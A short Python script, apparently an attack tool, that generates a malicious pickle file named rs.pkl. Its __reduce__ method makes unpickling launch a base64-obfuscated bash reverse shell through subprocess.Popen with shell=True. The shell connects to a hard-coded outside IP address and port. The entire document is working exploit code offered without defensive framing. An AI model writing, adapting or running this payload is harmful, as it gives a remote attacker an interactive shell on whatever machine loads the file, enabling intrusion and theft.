import pickle
import base64

class ObfuscatedReverseShell(object):

    def __init__(self, bash_cmd):
        self.bash_cmd = bash_cmd

    def __reduce__(self):
        import os
        import subprocess
        if os.name == 'posix':
            return (subprocess.Popen, (self.bash_cmd, -1, None, None, None, None, None, None, True))

if __name__ == '__main__':
    host = '52.207.225.255'
    port = 6006
    bash_cmd = bytes('bash -i >& /dev/tcp/{}/{} 0>&1'.format(host, port), 'ascii')
    obfus_bash_cmd = 'eval `echo {} | base64 -D`'.format(base64.b64encode(bash_cmd).decode('ascii'))
    rs = ObfuscatedReverseShell(obfus_bash_cmd)
    with open('rs.pkl', 'wb') as f:
        pickle.dump(rs, f)
